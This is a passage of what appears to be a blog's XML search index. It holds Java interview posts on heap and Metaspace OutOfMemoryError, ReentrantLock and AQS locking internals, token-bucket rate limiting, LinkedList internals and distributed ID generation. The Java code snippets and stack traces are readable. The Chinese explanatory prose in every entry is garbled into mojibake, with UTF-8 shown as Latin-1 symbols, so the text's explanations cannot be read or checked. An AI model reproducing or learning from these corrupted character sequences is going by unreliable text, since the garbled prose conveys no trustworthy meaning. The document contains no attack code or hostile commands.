    <content type="text"><![CDATA[OOM åˆ†æJava å †å†…å­˜æº¢å‡ºåœ¨ Java å †ä¸­åªè¦ä¸æ–­çš„åˆ›å»ºå¯¹è±¡ï¼Œå¹¶ä¸” GC-Roots åˆ°å¯¹è±¡ä¹‹é—´å­˜åœ¨å¼•ç”¨é“¾ï¼Œè¿™æ · JVM å°±ä¸ä¼šå›æ”¶å¯¹è±¡ã€‚ åªè¦å°†-Xms(æœ€å°å †),-Xmx(æœ€å¤§å †) è®¾ç½®ä¸ºä¸€æ ·ç¦æ­¢è‡ªåŠ¨æ‰©å±•å †å†…å­˜ã€‚ å½“ä½¿ç”¨ä¸€ä¸ª while(true) å¾ªç¯æ¥ä¸æ–­åˆ›å»ºå¯¹è±¡å°±ä¼šå‘ç”Ÿ OutOfMemoryï¼Œè¿˜å¯ä»¥ä½¿ç”¨ -XX:+HeapDumpOutofMemoryErorr å½“å‘ç”Ÿ OOM æ—¶ä¼šè‡ªåŠ¨ dump å †æ ˆåˆ°æ–‡ä»¶ä¸­ã€‚ ä¼ªä»£ç : 123456public static void main(String[] args) &#123; List&lt;String&gt; list = new ArrayList&lt;&gt;(10) ; while (true)&#123; list.add("1") ; &#125;&#125; å½“å‡ºç° OOM æ—¶å¯ä»¥é€šè¿‡å·¥å…·æ¥åˆ†æ GC-Roots å¼•ç”¨é“¾ ï¼ŒæŸ¥çœ‹å¯¹è±¡å’Œ GC-Roots æ˜¯å¦‚ä½•è¿›è¡Œå…³è”çš„ï¼Œæ˜¯å¦å­˜åœ¨å¯¹è±¡çš„ç”Ÿå‘½å‘¨æœŸè¿‡é•¿ï¼Œæˆ–è€…æ˜¯è¿™äº›å¯¹è±¡ç¡®å®æ”¹å­˜åœ¨çš„ï¼Œé‚£å°±è¦è€ƒè™‘å°†å †å†…å­˜è°ƒå¤§äº†ã€‚ 123456789101112131415Exception in thread &quot;main&quot; java.lang.OutOfMemoryError: Java heap space at java.util.Arrays.copyOf(Arrays.java:3210) at java.util.Arrays.copyOf(Arrays.java:3181) at java.util.ArrayList.grow(ArrayList.java:261) at java.util.ArrayList.ensureExplicitCapacity(ArrayList.java:235) at java.util.ArrayList.ensureCapacityInternal(ArrayList.java:227) at java.util.ArrayList.add(ArrayList.java:458) at com.crossoverjie.oom.HeapOOM.main(HeapOOM.java:18) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at com.intellij.rt.execution.application.AppMain.main(AppMain.java:147)Process finished with exit code 1 java.lang.OutOfMemoryError: Java heap spaceè¡¨ç¤ºå †å†…å­˜æº¢å‡ºã€‚ MetaSpace (å…ƒæ•°æ®) å†…å­˜æº¢å‡º JDK8 ä¸­å°†æ°¸ä¹…ä»£ç§»é™¤ï¼Œä½¿ç”¨ MetaSpace æ¥ä¿å­˜ç±»åŠ è½½ä¹‹åçš„ç±»ä¿¡æ¯ï¼Œå­—ç¬¦ä¸²å¸¸é‡æ± ä¹Ÿè¢«ç§»åŠ¨åˆ° Java å †ã€‚ PermSize å’Œ MaxPermSize å·²ç»ä¸èƒ½ä½¿ç”¨äº†ï¼Œåœ¨ JDK8 ä¸­é…ç½®è¿™ä¸¤ä¸ªå‚æ•°å°†ä¼šå‘å‡ºè­¦å‘Šã€‚ JDK 8 ä¸­å°†ç±»ä¿¡æ¯ç§»åˆ°åˆ°äº†æœ¬åœ°å †å†…å­˜(Native Heap)ä¸­ï¼Œå°†åŸæœ‰çš„æ°¸ä¹…ä»£ç§»åŠ¨åˆ°äº†æœ¬åœ°å †ä¸­æˆä¸º MetaSpace ,å¦‚æœä¸æŒ‡å®šè¯¥åŒºåŸŸçš„å¤§å°ï¼ŒJVM å°†ä¼šåŠ¨æ€çš„è°ƒæ•´ã€‚ å¯ä»¥ä½¿ç”¨ -XX:MaxMetaspaceSize=10M æ¥é™åˆ¶æœ€å¤§å…ƒæ•°æ®ã€‚è¿™æ ·å½“ä¸åœçš„åˆ›å»ºç±»æ—¶å°†ä¼šå æ»¡è¯¥åŒºåŸŸå¹¶å‡ºç° OOMã€‚ 123456789101112131415public static void main(String[] args) &#123; while (true)&#123; Enhancer enhancer = new Enhancer() ; enhancer.setSuperclass(HeapOOM.class); enhancer.setUseCache(false) ; enhancer.setCallback(new MethodInterceptor() &#123; @Override public Object intercept(Object o, Method method, Object[] objects, MethodProxy methodProxy) throws Throwable &#123; return methodProxy.invoke(o,objects) ; &#125; &#125;); enhancer.create() ; &#125;&#125; ä½¿ç”¨ cglib ä¸åœçš„åˆ›å»ºæ–°ç±»ï¼Œæœ€ç»ˆä¼šæŠ›å‡º:1234567891011Caused by: java.lang.reflect.InvocationTargetException at sun.reflect.GeneratedMethodAccessor1.invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at net.sf.cglib.core.ReflectUtils.defineClass(ReflectUtils.java:459) at net.sf.cglib.core.AbstractClassGenerator.generate(AbstractClassGenerator.java:336) ... 11 moreCaused by: java.lang.OutOfMemoryError: Metaspace at java.lang.ClassLoader.defineClass1(Native Method) at java.lang.ClassLoader.defineClass(ClassLoader.java:763) ... 16 more æ³¨æ„ï¼šè¿™é‡Œçš„ OOM ä¼´éšçš„æ˜¯ java.lang.OutOfMemoryError: Metaspace ä¹Ÿå°±æ˜¯å…ƒæ•°æ®æº¢å‡ºã€‚]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ReentrantLock]]></title>
    <url>%2F2018%2F06%2F30%2FJava%2FInterview%2FJava-Interview%2FReentrantLock%2F</url>
    <content type="text"><![CDATA[ReentrantLock å®ç°åŸç†ä½¿ç”¨ synchronize æ¥åšåŒæ­¥å¤„ç†æ—¶ï¼Œé”çš„è·å–å’Œé‡Šæ”¾éƒ½æ˜¯éšå¼çš„ï¼Œå®ç°çš„åŸç†æ˜¯é€šè¿‡ç¼–è¯‘ååŠ ä¸Šä¸åŒçš„æœºå™¨æŒ‡ä»¤æ¥å®ç°ã€‚ è€Œ ReentrantLock å°±æ˜¯ä¸€ä¸ªæ™®é€šçš„ç±»ï¼Œå®ƒæ˜¯åŸºäº AQS(AbstractQueuedSynchronizer)æ¥å®ç°çš„ã€‚ æ˜¯ä¸€ä¸ªé‡å…¥é”ï¼šä¸€ä¸ªçº¿ç¨‹è·å¾—äº†é”ä¹‹åä»ç„¶å¯ä»¥åå¤çš„åŠ é”ï¼Œä¸ä¼šå‡ºç°è‡ªå·±é˜»å¡è‡ªå·±çš„æƒ…å†µã€‚ AQS æ˜¯ Java å¹¶å‘åŒ…é‡Œå®ç°é”ã€åŒæ­¥çš„ä¸€ä¸ªé‡è¦çš„åŸºç¡€æ¡†æ¶ã€‚ é”ç±»å‹ReentrantLock åˆ†ä¸ºå…¬å¹³é”å’Œéå…¬å¹³é”ï¼Œå¯ä»¥é€šè¿‡æ„é€ æ–¹æ³•æ¥æŒ‡å®šå…·ä½“ç±»å‹ï¼š 123456789//é»˜è®¤éå…¬å¹³é”public ReentrantLock() &#123; sync = new NonfairSync();&#125;//å…¬å¹³é”public ReentrantLock(boolean fair) &#123; sync = fair ? new FairSync() : new NonfairSync();&#125; é»˜è®¤ä¸€èˆ¬ä½¿ç”¨éå…¬å¹³é”ï¼Œå®ƒçš„æ•ˆç‡å’Œååé‡éƒ½æ¯”å…¬å¹³é”é«˜çš„å¤š(åé¢ä¼šåˆ†æå…·ä½“åŸå› )ã€‚ è·å–é”é€šå¸¸çš„ä½¿ç”¨æ–¹å¼å¦‚ä¸‹: 1234567891011private ReentrantLock lock = new ReentrantLock();public void run() &#123; lock.lock(); try &#123; //do bussiness &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; finally &#123; lock.unlock(); &#125;&#125; å…¬å¹³é”è·å–é”é¦–å…ˆçœ‹ä¸‹è·å–é”çš„è¿‡ç¨‹ï¼š 123public void lock() &#123; sync.lock();&#125; å¯ä»¥çœ‹åˆ°æ˜¯ä½¿ç”¨ syncçš„æ–¹æ³•ï¼Œè€Œè¿™ä¸ªæ–¹æ³•æ˜¯ä¸€ä¸ªæŠ½è±¡æ–¹æ³•ï¼Œå…·ä½“æ˜¯ç”±å…¶å­ç±»(FairSync)æ¥å®ç°çš„ï¼Œä»¥ä¸‹æ˜¯å…¬å¹³é”çš„å®ç°: 12345678910 final void lock() &#123; acquire(1); &#125; //AbstractQueuedSynchronizer ä¸­çš„ acquire() public final void acquire(int arg) &#123; if (!tryAcquire(arg) &amp;&amp; acquireQueued(addWaiter(Node.EXCLUSIVE), arg)) selfInterrupt();&#125; ç¬¬ä¸€æ­¥æ˜¯å°è¯•è·å–é”(tryAcquire(arg)),è¿™ä¸ªä¹Ÿæ˜¯ç”±å…¶å­ç±»å®ç°ï¼š 1234567891011121314151617181920 protected final boolean tryAcquire(int acquires) &#123; final Thread current = Thread.currentThread(); int c = getState(); if (c == 0) &#123; if (!hasQueuedPredecessors() &amp;&amp; compareAndSetState(0, acquires)) &#123; setExclusiveOwnerThread(current); return true; &#125; &#125; else if (current == getExclusiveOwnerThread()) &#123; int nextc = c + acquires; if (nextc &lt; 0) throw new Error("Maximum lock count exceeded"); setState(nextc); return true; &#125; return false; &#125;&#125; é¦–å…ˆä¼šåˆ¤æ–­ AQS ä¸­çš„ state æ˜¯å¦ç­‰äº 0ï¼Œ0 è¡¨ç¤ºç›®å‰æ²¡æœ‰å…¶ä»–çº¿ç¨‹è·å¾—é”ï¼Œå½“å‰çº¿ç¨‹å°±å¯ä»¥å°è¯•è·å–é”ã€‚ æ³¨æ„:å°è¯•ä¹‹å‰ä¼šåˆ©ç”¨ hasQueuedPredecessors() æ–¹æ³•æ¥åˆ¤æ–­ AQS çš„é˜Ÿåˆ—ä¸­ä¸­æ˜¯å¦æœ‰å…¶ä»–çº¿ç¨‹ï¼Œå¦‚æœæœ‰åˆ™ä¸ä¼šå°è¯•è·å–é”(è¿™æ˜¯å…¬å¹³é”ç‰¹æœ‰çš„æƒ…å†µ)ã€‚ å¦‚æœé˜Ÿåˆ—ä¸­æ²¡æœ‰çº¿ç¨‹å°±åˆ©ç”¨ CAS æ¥å°† AQS ä¸­çš„ state ä¿®æ”¹ä¸º1ï¼Œä¹Ÿå°±æ˜¯è·å–é”ï¼Œè·å–æˆåŠŸåˆ™å°†å½“å‰çº¿ç¨‹ç½®ä¸ºè·å¾—é”çš„ç‹¬å çº¿ç¨‹(setExclusiveOwnerThread(current))ã€‚ å¦‚æœ state å¤§äº 0 æ—¶ï¼Œè¯´æ˜é”å·²ç»è¢«è·å–äº†ï¼Œåˆ™éœ€è¦åˆ¤æ–­è·å–é”çš„çº¿ç¨‹æ˜¯å¦ä¸ºå½“å‰çº¿ç¨‹(ReentrantLock æ”¯æŒé‡å…¥)ï¼Œæ˜¯åˆ™éœ€è¦å°† state + 1ï¼Œå¹¶å°†å€¼æ›´æ–°ã€‚ å†™å…¥é˜Ÿåˆ—å¦‚æœ tryAcquire(arg) è·å–é”å¤±è´¥ï¼Œåˆ™éœ€è¦ç”¨ addWaiter(Node.EXCLUSIVE) å°†å½“å‰çº¿ç¨‹å†™å…¥é˜Ÿåˆ—ä¸­ã€‚ å†™å…¥ä¹‹å‰éœ€è¦å°†å½“å‰çº¿ç¨‹åŒ…è£…ä¸ºä¸€ä¸ª Node å¯¹è±¡(addWaiter(Node.EXCLUSIVE))ã€‚ AQS ä¸­çš„é˜Ÿåˆ—æ˜¯ç”± Node èŠ‚ç‚¹ç»„æˆçš„åŒå‘é“¾è¡¨å®ç°çš„ã€‚ åŒ…è£…ä»£ç : 1234567891011121314private Node addWaiter(Node mode) &#123; Node node = new Node(Thread.currentThread(), mode); // Try the fast path of enq; backup to full enq on failure Node pred = tail; if (pred != null) &#123; node.prev = pred; if (compareAndSetTail(pred, node)) &#123; pred.next = node; return node; &#125; &#125; enq(node); return node;&#125; é¦–å…ˆåˆ¤æ–­é˜Ÿåˆ—æ˜¯å¦ä¸ºç©ºï¼Œä¸ä¸ºç©ºæ—¶åˆ™å°†å°è£…å¥½çš„ Node åˆ©ç”¨ CAS å†™å…¥é˜Ÿå°¾ï¼Œå¦‚æœå‡ºç°å¹¶å‘å†™å…¥å¤±è´¥å°±éœ€è¦è°ƒç”¨ enq(node); æ¥å†™å…¥äº†ã€‚ 123456789101112131415private Node enq(final Node node) &#123; for (;;) &#123; Node t = tail; if (t == null) &#123; // Must initialize if (compareAndSetHead(new Node())) tail = head; &#125; else &#123; node.prev = t; if (compareAndSetTail(t, node)) &#123; t.next = node; return t; &#125; &#125; &#125;&#125; è¿™ä¸ªå¤„ç†é€»è¾‘å°±ç›¸å½“äºè‡ªæ—‹åŠ ä¸Š CAS ä¿è¯ä¸€å®šèƒ½å†™å…¥é˜Ÿåˆ—ã€‚ æŒ‚èµ·ç­‰å¾…çº¿ç¨‹å†™å…¥é˜Ÿåˆ—ä¹‹åéœ€è¦å°†å½“å‰çº¿ç¨‹æŒ‚èµ·(åˆ©ç”¨acquireQueued(addWaiter(Node.EXCLUSIVE), arg))ï¼š 123456789101112131415161718192021final boolean acquireQueued(final Node node, int arg) &#123; boolean failed = true; try &#123; boolean interrupted = false; for (;;) &#123; final Node p = node.predecessor(); if (p == head &amp;&amp; tryAcquire(arg)) &#123; setHead(node); p.next = null; // help GC failed = false; return interrupted; &#125; if (shouldParkAfterFailedAcquire(p, node) &amp;&amp; parkAndCheckInterrupt()) interrupted = true; &#125; &#125; finally &#123; if (failed) cancelAcquire(node); &#125;&#125; é¦–å…ˆä¼šæ ¹æ® node.predecessor() è·å–åˆ°ä¸Šä¸€ä¸ªèŠ‚ç‚¹æ˜¯å¦ä¸ºå¤´èŠ‚ç‚¹ï¼Œå¦‚æœæ˜¯åˆ™å°è¯•è·å–ä¸€æ¬¡é”ï¼Œè·å–æˆåŠŸå°±ä¸‡äº‹å¤§å‰äº†ã€‚ å¦‚æœä¸æ˜¯å¤´èŠ‚ç‚¹ï¼Œæˆ–è€…è·å–é”å¤±è´¥ï¼Œåˆ™ä¼šæ ¹æ®ä¸Šä¸€ä¸ªèŠ‚ç‚¹çš„ waitStatus çŠ¶æ€æ¥å¤„ç†(shouldParkAfterFailedAcquire(p, node))ã€‚ waitStatus ç”¨äºè®°å½•å½“å‰èŠ‚ç‚¹çš„çŠ¶æ€ï¼Œå¦‚èŠ‚ç‚¹å–æ¶ˆã€èŠ‚ç‚¹ç­‰å¾…ç­‰ã€‚ shouldParkAfterFailedAcquire(p, node) è¿”å›å½“å‰çº¿ç¨‹æ˜¯å¦éœ€è¦æŒ‚èµ·ï¼Œå¦‚æœéœ€è¦åˆ™è°ƒç”¨ parkAndCheckInterrupt()ï¼š 1234private final boolean parkAndCheckInterrupt() &#123; LockSupport.park(this); return Thread.interrupted();&#125; ä»–æ˜¯åˆ©ç”¨ LockSupport çš„ part æ–¹æ³•æ¥æŒ‚èµ·å½“å‰çº¿ç¨‹çš„ï¼Œç›´åˆ°è¢«å”¤é†’ã€‚ éå…¬å¹³é”è·å–é”å…¬å¹³é”ä¸éå…¬å¹³é”çš„å·®å¼‚ä¸»è¦åœ¨è·å–é”ï¼š å…¬å¹³é”å°±ç›¸å½“äºä¹°ç¥¨ï¼Œåæ¥çš„äººéœ€è¦æ’åˆ°é˜Ÿå°¾ä¾æ¬¡ä¹°ç¥¨ï¼Œä¸èƒ½æ’é˜Ÿã€‚ è€Œéå…¬å¹³é”åˆ™æ²¡æœ‰è¿™äº›è§„åˆ™ï¼Œæ˜¯æŠ¢å æ¨¡å¼ï¼Œæ¯æ¥ä¸€ä¸ªäººä¸ä¼šå»ç®¡é˜Ÿåˆ—å¦‚ä½•ï¼Œç›´æ¥å°è¯•è·å–é”ã€‚ éå…¬å¹³é”:1234567final void lock() &#123; //ç›´æ¥å°è¯•è·å–é” if (compareAndSetState(0, 1)) setExclusiveOwnerThread(Thread.currentThread()); else acquire(1);&#125; å…¬å¹³é”:123final void lock() &#123; acquire(1);&#125; è¿˜è¦ä¸€ä¸ªé‡è¦çš„åŒºåˆ«æ˜¯åœ¨å°è¯•è·å–é”æ—¶tryAcquire(arg)ï¼Œéå…¬å¹³é”æ˜¯ä¸éœ€è¦åˆ¤æ–­é˜Ÿåˆ—ä¸­æ˜¯å¦è¿˜æœ‰å…¶ä»–çº¿ç¨‹ï¼Œä¹Ÿæ˜¯ç›´æ¥å°è¯•è·å–é”ï¼š 12345678910111213141516171819final boolean nonfairTryAcquire(int acquires) &#123; final Thread current = Thread.currentThread(); int c = getState(); if (c == 0) &#123; //æ²¡æœ‰ !hasQueuedPredecessors() åˆ¤æ–­ if (compareAndSetState(0, acquires)) &#123; setExclusiveOwnerThread(current); return true; &#125; &#125; else if (current == getExclusiveOwnerThread()) &#123; int nextc = c + acquires; if (nextc &lt; 0) // overflow throw new Error("Maximum lock count exceeded"); setState(nextc); return true; &#125; return false;&#125; é‡Šæ”¾é”å…¬å¹³é”å’Œéå…¬å¹³é”çš„é‡Šæ”¾æµç¨‹éƒ½æ˜¯ä¸€æ ·çš„ï¼š 12345678910111213141516171819202122232425262728public void unlock() &#123; sync.release(1);&#125;public final boolean release(int arg) &#123; if (tryRelease(arg)) &#123; Node h = head; if (h != null &amp;&amp; h.waitStatus != 0) //å”¤é†’è¢«æŒ‚èµ·çš„çº¿ç¨‹ unparkSuccessor(h); return true; &#125; return false;&#125;//å°è¯•é‡Šæ”¾é”protected final boolean tryRelease(int releases) &#123; int c = getState() - releases; if (Thread.currentThread() != getExclusiveOwnerThread()) throw new IllegalMonitorStateException(); boolean free = false; if (c == 0) &#123; free = true; setExclusiveOwnerThread(null); &#125; setState(c); return free;&#125; é¦–å…ˆä¼šåˆ¤æ–­å½“å‰çº¿ç¨‹æ˜¯å¦ä¸ºè·å¾—é”çš„çº¿ç¨‹ï¼Œç”±äºæ˜¯é‡å…¥é”æ‰€ä»¥éœ€è¦å°† state å‡åˆ° 0 æ‰è®¤ä¸ºå®Œå…¨é‡Šæ”¾é”ã€‚ é‡Šæ”¾ä¹‹åéœ€è¦è°ƒç”¨ unparkSuccessor(h) æ¥å”¤é†’è¢«æŒ‚èµ·çš„çº¿ç¨‹ã€‚ æ€»ç»“ç”±äºå…¬å¹³é”éœ€è¦å…³å¿ƒé˜Ÿåˆ—çš„æƒ…å†µï¼Œå¾—æŒ‰ç…§é˜Ÿåˆ—é‡Œçš„å…ˆåé¡ºåºæ¥è·å–é”(ä¼šé€ æˆå¤§é‡çš„çº¿ç¨‹ä¸Šä¸‹æ–‡åˆ‡æ¢)ï¼Œè€Œéå…¬å¹³é”åˆ™æ²¡æœ‰è¿™ä¸ªé™åˆ¶ã€‚ æ‰€ä»¥ä¹Ÿå°±èƒ½è§£é‡Šéå…¬å¹³é”çš„æ•ˆç‡ä¼šè¢«å…¬å¹³é”æ›´é«˜ã€‚]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Limiting]]></title>
    <url>%2F2018%2F06%2F30%2FJava%2FInterview%2FJava-Interview%2FLimiting%2F</url>
    <content type="text"><![CDATA[é™æµç®—æ³•é™æµæ˜¯è§£å†³é«˜å¹¶å‘å¤§æµé‡çš„ä¸€ç§æ–¹æ¡ˆï¼Œè‡³å°‘æ˜¯å¯ä»¥ä¿è¯åº”ç”¨çš„å¯ç”¨æ€§ã€‚ é€šå¸¸æœ‰ä»¥ä¸‹ä¸¤ç§é™æµæ–¹æ¡ˆï¼š æ¼æ¡¶ç®—æ³• ä»¤ç‰Œæ¡¶ç®—æ³• æ¼æ¡¶ç®—æ³• æ¼æ¡¶ç®—æ³•éå¸¸ç®€å•ï¼Œå°±æ˜¯å°†æµé‡æ”¾å…¥æ¡¶ä¸­å¹¶æŒ‰ç…§ä¸€å®šçš„é€Ÿç‡æµå‡ºã€‚å¦‚æœæµé‡è¿‡å¤§æ—¶å€™å¹¶ä¸ä¼šæé«˜æµå‡ºæ•ˆç‡ï¼Œè€Œæº¢å‡ºçš„æµé‡ä¹Ÿåªèƒ½æ˜¯æŠ›å¼ƒæ‰äº†ã€‚ è¿™ç§ç®—æ³•å¾ˆç®€å•ï¼Œä½†ä¹Ÿéå¸¸ç²—æš´ï¼Œæ— æ³•åº”å¯¹çªå‘çš„å¤§æµé‡ã€‚è¿™æ—¶å¯ä»¥è€ƒè™‘ä»¤ç‰Œæ¡¶ç®—æ³•ã€‚ ä»¤ç‰Œæ¡¶ç®—æ³• ä»¤ç‰Œæ¡¶ç®—æ³•æ˜¯æŒ‰ç…§æ’å®šçš„é€Ÿç‡å‘æ¡¶ä¸­æ”¾å…¥ä»¤ç‰Œï¼Œæ¯å½“è¯·æ±‚ç»è¿‡æ—¶åˆ™æ¶ˆè€—ä¸€ä¸ªæˆ–å¤šä¸ªä»¤ç‰Œã€‚å½“æ¡¶ä¸­çš„ä»¤ç‰Œä¸º 0 æ—¶ï¼Œè¯·æ±‚åˆ™ä¼šè¢«é˜»å¡ã€‚ noteï¼šä»¤ç‰Œæ¡¶ç®—æ³•æ”¯æŒå…ˆæ¶ˆè´¹åä»˜æ¬¾ï¼Œæ¯”å¦‚ä¸€ä¸ªè¯·æ±‚å¯ä»¥è·å–å¤šä¸ªç”šè‡³å…¨éƒ¨çš„ä»¤ç‰Œï¼Œä½†æ˜¯éœ€è¦åé¢çš„è¯·æ±‚ä»˜è´¹ã€‚ä¹Ÿå°±æ˜¯è¯´åé¢çš„è¯·æ±‚éœ€è¦ç­‰åˆ°æ¡¶ä¸­çš„ä»¤ç‰Œè¡¥é½ä¹‹åæ‰èƒ½ç»§ç»­è·å–ã€‚ å®ä¾‹:12345678910111213141516171819202122232425@Overridepublic BaseResponse&lt;UserResVO&gt; getUserByFeignBatch(@RequestBody UserReqVO userReqVO) &#123; //è°ƒç”¨è¿œç¨‹æœåŠ¡ OrderNoReqVO vo = new OrderNoReqVO() ; vo.setReqNo(userReqVO.getReqNo()); RateLimiter limiter = RateLimiter.create(2.0) ; //æ‰¹é‡è°ƒç”¨ for (int i = 0 ;i&lt; 10 ; i++)&#123; double acquire = limiter.acquire(); logger.debug("è·å–ä»¤ç‰ŒæˆåŠŸ!,æ¶ˆè€—=" + acquire); BaseResponse&lt;OrderNoResVO&gt; orderNo = orderServiceClient.getOrderNo(vo); logger.debug("è¿œç¨‹è¿”å›:"+JSON.toJSONString(orderNo)); &#125; UserRes userRes = new UserRes() ; userRes.setUserId(123); userRes.setUserName("å¼ ä¸‰"); userRes.setReqNo(userReqVO.getReqNo()); userRes.setCode(StatusEnum.SUCCESS.getCode()); userRes.setMessage("æˆåŠŸ"); return userRes ;&#125; å• JVM é™æµ åˆ†å¸ƒå¼é™æµ]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LinkedList]]></title>
    <url>%2F2018%2F06%2F30%2FJava%2FInterview%2FJava-Interview%2FLinkedList%2F</url>
    <content type="text"><![CDATA[LinkedList åº•å±‚åˆ†æ å¦‚å›¾æ‰€ç¤º LinkedList åº•å±‚æ˜¯åŸºäºåŒå‘é“¾è¡¨å®ç°çš„ï¼Œä¹Ÿæ˜¯å®ç°äº† List æ¥å£ï¼Œæ‰€ä»¥ä¹Ÿæ‹¥æœ‰ List çš„ä¸€äº›ç‰¹ç‚¹(JDK1.7/8 ä¹‹åå–æ¶ˆäº†å¾ªç¯ï¼Œä¿®æ”¹ä¸ºåŒå‘é“¾è¡¨)ã€‚ æ–°å¢æ–¹æ³•123456789101112131415161718public boolean add(E e) &#123; linkLast(e); return true;&#125; /** * Links e as last element. */void linkLast(E e) &#123; final Node&lt;E&gt; l = last; final Node&lt;E&gt; newNode = new Node&lt;&gt;(l, e, null); last = newNode; if (l == null) first = newNode; else l.next = newNode; size++; modCount++;&#125; å¯è§æ¯æ¬¡æ’å…¥éƒ½æ˜¯ç§»åŠ¨æŒ‡é’ˆï¼Œå’Œ ArrayList çš„æ‹·è´æ•°ç»„æ¥è¯´æ•ˆç‡è¦é«˜ä¸Šä¸å°‘ã€‚ æŸ¥è¯¢æ–¹æ³•1234567891011121314151617181920public E get(int index) &#123; checkElementIndex(index); return node(index).item;&#125;Node&lt;E&gt; node(int index) &#123; // assert isElementIndex(index); if (index &lt; (size &gt;&gt; 1)) &#123; Node&lt;E&gt; x = first; for (int i = 0; i &lt; index; i++) x = x.next; return x; &#125; else &#123; Node&lt;E&gt; x = last; for (int i = size - 1; i &gt; index; i--) x = x.prev; return x; &#125;&#125; ç”±æ­¤å¯ä»¥çœ‹å‡ºæ˜¯ä½¿ç”¨äºŒåˆ†æŸ¥æ‰¾æ¥çœ‹ index ç¦» size ä¸­é—´è·ç¦»æ¥åˆ¤æ–­æ˜¯ä»å¤´ç»“ç‚¹æ­£åºæŸ¥è¿˜æ˜¯ä»å°¾èŠ‚ç‚¹å€’åºæŸ¥ã€‚ node()ä¼šä»¥O(n/2)çš„æ€§èƒ½å»è·å–ä¸€ä¸ªç»“ç‚¹ å¦‚æœç´¢å¼•å€¼å¤§äºé“¾è¡¨å¤§å°çš„ä¸€åŠï¼Œé‚£ä¹ˆå°†ä»å°¾ç»“ç‚¹å¼€å§‹éå† è¿™æ ·çš„æ•ˆç‡æ˜¯éå¸¸ä½çš„ï¼Œç‰¹åˆ«æ˜¯å½“ index è¶Šæ¥è¿‘ size çš„ä¸­é—´å€¼æ—¶ã€‚ æ€»ç»“ï¼š LinkedList æ’å…¥ï¼Œåˆ é™¤éƒ½æ˜¯ç§»åŠ¨æŒ‡é’ˆæ•ˆç‡å¾ˆé«˜ã€‚ æŸ¥æ‰¾éœ€è¦è¿›è¡Œéå†æŸ¥è¯¢ï¼Œæ•ˆç‡è¾ƒä½ã€‚]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ID-generator]]></title>
    <url>%2F2018%2F06%2F30%2FJava%2FInterview%2FJava-Interview%2FID-generator%2F</url>
    <content type="text"><![CDATA[åˆ†å¸ƒå¼ ID ç”Ÿæˆå™¨ä¸€ä¸ªå”¯ä¸€ ID åœ¨ä¸€ä¸ªåˆ†å¸ƒå¼ç³»ç»Ÿä¸­æ˜¯éå¸¸é‡è¦çš„ä¸€ä¸ªä¸šåŠ¡å±æ€§ï¼Œå…¶ä¸­åŒ…æ‹¬ä¸€äº›å¦‚è®¢å• IDï¼Œæ¶ˆæ¯ ID ï¼Œä¼šè¯ IDï¼Œä»–ä»¬éƒ½æœ‰ä¸€äº›å…±æœ‰çš„ç‰¹æ€§ï¼š å…¨å±€å”¯ä¸€ã€‚ è¶‹åŠ¿é€’å¢ã€‚ å…¨å±€å”¯ä¸€å¾ˆå¥½ç†è§£ï¼Œç›®çš„å°±æ˜¯å”¯ä¸€æ ‡è¯†æŸä¸ªæ¬¡è¯·æ±‚ï¼ŒæŸä¸ªä¸šåŠ¡ã€‚ é€šå¸¸æœ‰ä»¥ä¸‹å‡ ç§æ–¹æ¡ˆï¼š åŸºäºæ•°æ®åº“å¯ä»¥åˆ©ç”¨ MySQL ä¸­çš„è‡ªå¢å±æ€§ auto_increment æ¥ç”Ÿæˆå…¨å±€å”¯ä¸€ IDï¼Œä¹Ÿèƒ½ä¿è¯è¶‹åŠ¿é€’å¢ã€‚ä½†è¿™ç§æ–¹å¼å¤ªä¾èµ– DBï¼Œå¦‚æœæ•°æ®åº“æŒ‚äº†é‚£å°±éå¸¸å®¹æ˜“å‡ºé—®é¢˜ã€‚ æ°´å¹³æ‰©å±•æ”¹è¿›ä½†ä¹Ÿæœ‰æ”¹è¿›ç©ºé—´ï¼Œå¯ä»¥å°†æ•°æ®åº“æ°´å¹³æ‹†åˆ†ï¼Œå¦‚æœæ‹†ä¸ºäº†ä¸¤ä¸ªåº“ A åº“å’Œ B åº“ã€‚A åº“çš„é€’å¢æ–¹å¼å¯ä»¥æ˜¯ 0 ,2 ,4 ,6ã€‚B åº“åˆ™æ˜¯ 1 ,3 ,5 ,7ã€‚è¿™æ ·çš„æ–¹å¼å¯ä»¥æé«˜ç³»ç»Ÿå¯ç”¨æ€§ï¼Œå¹¶ä¸” ID ä¹Ÿæ˜¯è¶‹åŠ¿é€’å¢çš„ã€‚ ä½†ä¹Ÿæœ‰å¦‚ä¸‹ä¸€ä¸‹é—®é¢˜ï¼š æƒ³è¦æ‰©å®¹å¢åŠ æ€§èƒ½å˜çš„å›°éš¾ï¼Œä¹‹å‰å·²ç»å®šä¹‰å¥½äº† A B åº“é€’å¢çš„æ­¥æ•°ï¼Œæ–°åŠ çš„æ•°æ®åº“ä¸å¥½åŠ å…¥è¿›æ¥ï¼Œæ°´å¹³æ‰©å±•å›°éš¾ã€‚ 